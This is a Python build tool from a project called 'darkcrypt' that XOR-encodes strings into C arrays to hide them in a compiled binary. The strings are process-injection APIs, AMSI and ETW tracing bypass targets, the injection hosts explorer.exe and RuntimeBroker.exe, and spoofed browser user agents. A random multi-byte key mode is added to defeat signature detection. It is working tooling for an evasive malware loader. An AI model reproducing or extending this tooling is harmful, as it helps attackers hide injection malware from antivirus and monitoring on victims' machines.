#!/usr/bin/env python3
"""
xor_encode.py — Generate XOR-encoded byte arrays for darkcrypt string obfuscation.

Usage:
  python3 tools/xor_encode.py "explorer.exe" 0x42
  python3 tools/xor_encode.py --wide "Mozilla/5.0 ..." 0x37
  python3 tools/xor_encode.py --all   # generate all strings used in darkcrypt (single-byte)

  # --- multi-byte rolling key (F18) ---
  python3 tools/xor_encode.py --mb-key 0x37,0x5a,0x9a "RuntimeBroker.exe"
  python3 tools/xor_encode.py --mb-key-random 6 "RuntimeBroker.exe"
  python3 tools/xor_encode.py --all-mb   # all strings, each with a unique random MB key
"""

import os
import random
import sys

def xor_encode(data: bytes, key: int) -> list:
    return [b ^ key for b in data]

def format_array(name, data, key, wide=False):
    enc = xor_encode(data, key)
    if wide:
        # encode as UTF-16LE bytes
        wide_data = data.decode('utf-8').encode('utf-16-le')
        enc = xor_encode(wide_data, key)
    nchars = len(data.decode('utf-8')) if wide else len(data)
    arr_len = len(enc)
    hex_str = ', '.join(f'0x{b:02x}' for b in enc)
    print(f'// "{data.decode('utf-8')}" XOR 0x{key:02x} ({nchars} chars, {arr_len} bytes)')
    print(f'static const uint8_t {name}[{arr_len}] = {{ {hex_str} }};')
    print(f'// Usage: char _buf[{nchars+1}]; char *s = xor_dec(_buf, {name}, {nchars}, 0x{key:02x});')
    print()

def generate_all():
    strings = [
        # (name, string, key, wide)
        ("_enc_explorer", "explorer.exe", 0x42, False),
        ("_enc_ntdll", "ntdll.dll", 0x37, False),
        ("_enc_amsi_dll", "amsi.dll", 0x37, False),
        ("_enc_NtAlloc", "NtAllocateVirtualMemory", 0x5a, False),
        ("_enc_NtWrite", "NtWriteVirtualMemory", 0x5a, False),
        ("_enc_NtQueueApc", "NtQueueApcThread", 0x5a, False),
        ("_enc_NtProtect", "NtProtectVirtualMemory", 0x5a, False),
        ("_enc_NtFree", "NtFreeVirtualMemory", 0x5a, False),
        ("_enc_NtQueryInfo", "NtQueryInformationProcess", 0x5a, False),
        ("_enc_NtSetInfoThread", "NtSetInformationThread", 0x5a, False),
        ("_enc_EtwEventWrite", "EtwEventWrite", 0x4d, False),
        ("_enc_NtTraceEvent", "NtTraceEvent", 0x4d, False),
        ("_enc_AmsiScanBuffer", "AmsiScanBuffer", 0x4d, False),
        ("_enc_NtCreateThreadEx", "NtCreateThreadEx", 0x5a, False),
        # Wide strings
        ("_enc_ua1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 0x37, True),
        ("_enc_ua2", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", 0x37, True),
        ("_enc_ua3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", 0x37, True),
        ("_enc_explorer_w", "explorer.exe", 0x42, True),
        ("_enc_runtimebroker_w", "RuntimeBroker.exe", 0x42, True),
    ]
    for name, s, key, wide in strings:
        data = s.encode('utf-8')
        format_array(name, data, key, wide=wide)


# ---- multi-byte rolling-key helpers (F18) ----

def parse_mb_key(spec: str) -> list:
    """Parse a multi-byte key spec: '0x37,0x5a,0x9a' or comma/whitespace-separated
    hex bytes, or a bare byte string. Returns a list of ints in 0..255."""
    spec = spec.strip()
    if ',' in spec:
        parts = [p.strip() for p in spec.split(',') if p.strip()]
    elif ' ' in spec:
        parts = spec.split()
    else:
        parts = [spec]
    out = [int(p, 0) & 0xFF for p in parts]
    if not out:
        raise ValueError("empty key spec")
    return out


def xor_encode_mb(data: bytes, key: list) -> list:
    klen = len(key)
    return [data[i] ^ key[i % klen] for i in range(len(data))]


def emit_mb(name: str, data: bytes, key: list, wide: bool = False,
            name_prefix: str = "_enc", key_prefix: str = "_enc_key"):
    """Print key array + encoded array + usage comment for one string.
    Array names: key=<key_prefix>_<basename>, enc=<name_prefix>_<basename>."""
    base = name
    for pfx in ("_enc_key_", "_enc_"):
        if base.startswith(pfx):
            base = base[len(pfx):]
            break
    enc_name = f"{name_prefix}_{base}"
    key_name = f"{key_prefix}_{base}"

    wide_data = data.decode('utf-8').encode('utf-16-le') if wide else data
    enc = xor_encode_mb(wide_data, key)
    klen = len(key)
    arr_len = len(enc)
    nchars = len(data.decode('utf-8'))

    key_hex = ', '.join(f'0x{b:02x}' for b in key)
    enc_hex = ', '.join(f'0x{b:02x}' for b in enc)

    print(f'// "{data.decode("utf-8")}" MB-XOR key_len={klen} ({nchars} chars, {arr_len} bytes)')
    print(f'static const uint8_t {key_name}[{klen}] = {{ {key_hex} }};')
    print(f'static const uint8_t {enc_name}[{arr_len}] = {{ {enc_hex} }};')
    if wide:
        print(f'// Usage: wchar_t _buf[{nchars+1}]; wchar_t *s = '
              f'xor_dec_w_mb(_buf, {enc_name}, {nchars}, {key_name}, {klen});')
    else:
        print(f'// Usage: char _buf[{nchars+1}]; char *s = '
              f'xor_dec_mb(_buf, {enc_name}, {nchars}, {key_name}, {klen});')
    print()


def generate_all_mb():
    """Regenerate every string from the --all list, each with its OWN unique
    random multi-byte key (key length 4..8 bytes, randomized per string)."""
    strings = [
        # (name, string, wide)
        ("_enc_explorer", "explorer.exe", False),
        ("_enc_ntdll", "ntdll.dll", False),
        ("_enc_amsi_dll", "amsi.dll", False),
        ("_enc_NtAlloc", "NtAllocateVirtualMemory", False),
        ("_enc_NtWrite", "NtWriteVirtualMemory", False),
        ("_enc_NtQueueApc", "NtQueueApcThread", False),
        ("_enc_NtProtect", "NtProtectVirtualMemory", False),
        ("_enc_NtFree", "NtFreeVirtualMemory", False),
        ("_enc_NtQueryInfo", "NtQueryInformationProcess", False),
        ("_enc_NtSetInfoThread", "NtSetInformationThread", False),
        ("_enc_EtwEventWrite", "EtwEventWrite", False),
        ("_enc_NtTraceEvent", "NtTraceEvent", False),
        ("_enc_AmsiScanBuffer", "AmsiScanBuffer", False),
        ("_enc_NtCreateThreadEx", "NtCreateThreadEx", False),
        ("_enc_ua1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", True),
        ("_enc_ua2", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", True),
        ("_enc_ua3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", True),
        ("_enc_explorer_w", "explorer.exe", True),
        ("_enc_runtimebroker_w", "RuntimeBroker.exe", True),
    ]
    print("// ===== darkcrypt multi-byte rolling-key string set (--all-mb) =====")
    print("// Each string has its own unique random key; recovering one string")
    print("// does NOT reveal the keys of the others.")
    print()
    for name, s, wide in strings:
        klen = random.randint(4, 8)
        key = list(os.urandom(klen))
        emit_mb(name, s.encode('utf-8'), key, wide=wide)
    print("// ===== end --all-mb =====")


def _pop_arg(argv, flag):
    """Remove flag and its value from argv; return (value, remaining_argv)."""
    if flag not in argv:
        return None, argv
    idx = argv.index(flag)
    val = argv[idx + 1] if idx + 1 < len(argv) else None
    rest = argv[:idx] + argv[idx + 2:]
    return val, rest

if __name__ == '__main__':
    argv = list(sys.argv)
    wide = '--wide' in argv
    argv = [a for a in argv if a != '--wide']

    # ---- --all-mb (exclusive) ----
    if '--all-mb' in argv:
        generate_all_mb()
        sys.exit(0)

    # ---- --all (single-byte, original behavior) ----
    if '--all' in argv:
        generate_all()
        sys.exit(0)

    # ---- multi-byte ad-hoc flags ----
    mb_key_spec, argv = _pop_arg(argv, '--mb-key')
    mb_rand_spec, argv = _pop_arg(argv, '--mb-key-random')

    positional = [a for a in argv[1:] if not a.startswith('--')]

    if mb_key_spec is not None or mb_rand_spec is not None:
        if not positional:
            print("Usage: xor_encode.py --mb-key <hex>|--mb-key-random <N> <string> [--wide]",
                  file=sys.stderr)
            sys.exit(1)
        s = positional[0]
        if mb_rand_spec is not None:
            try:
                n = int(mb_rand_spec, 0)
            except ValueError:
                print(f"error: --mb-key-random expects an integer, got {mb_rand_spec!r}",
                      file=sys.stderr)
                sys.exit(1)
            if n < 1 or n > 256:
                print("error: --mb-key-random N must be in 1..256", file=sys.stderr)
                sys.exit(1)
            key = list(os.urandom(n))
            print(f"// random {n}-byte key generated; paste BOTH arrays into source:")
            print(f'// key = {{ {", ".join(f"0x{b:02x}" for b in key)} }}')
            print()
        else:
            try:
                key = parse_mb_key(mb_key_spec)
            except ValueError as e:
                print(f"error: bad --mb-key spec: {e}", file=sys.stderr)
                sys.exit(1)
        emit_mb("_enc_tmp", s.encode('utf-8'), key, wide=wide)
        sys.exit(0)

    # ---- original single-byte ad-hoc mode: <string> <key> ----
    if len(positional) >= 2:
        s = positional[0]
        key = int(positional[1], 0)
        format_array("_enc_tmp", s.encode('utf-8'), key, wide=wide)
    elif len(sys.argv) == 1:
        generate_all()
    else:
        print(f"Usage: {sys.argv[0]} <string> <key> [--wide]")
        print(f"       {sys.argv[0]} --all")
        print(f"       {sys.argv[0]} --mb-key <hex> <string> [--wide]")
        print(f"       {sys.argv[0]} --mb-key-random <N> <string> [--wide]")
        print(f"       {sys.argv[0]} --all-mb")
        sys.exit(1)